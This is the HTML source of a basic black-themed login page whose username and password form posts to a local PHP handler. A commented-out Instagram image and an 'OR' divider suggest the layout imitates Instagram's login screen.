<!DOCTYPE html>
<html lang="en" style="background-color: black;">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
<script src="https://kit.fontawesome.com/a076d05399.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
<link rel="stylesheet" type="text/css" href="index.css">
 <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">    <link rel="stylesheet" href="styles.css">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  
<form action="proses_login.php" method="post">
<div class="wrapper" style="background-color: black;">
    <div class="header">

      <div class="top">
       <div class="logo">
      <img src="ppp.png" alt="">
        <!-- <img src="instagram.png" alt="instagram" style="width: 175px;"> -->
      </div>
      
      <div class="or">
        <div class="line"></div>
        <p>OR</p>
        <div class="line"></div>
      </div>

        <div class="form">
          <div class="input_field">
           <input type="text" name="username" placeholder="username" class="input">
        </div>

        <div class="input_field">
           <input type="password" name ="password" placeholder="password" class="input">
        </div>

        <div class="forgot">
          <a href="#">Forgot password?</a>
        </div>

        <button type="submit" class="btn btn-primary">Login</button>
      </div>
      
      <div class="dif">
      
        
      </div>
    </div>
      
  </div>
  </form>

</body>
</html>

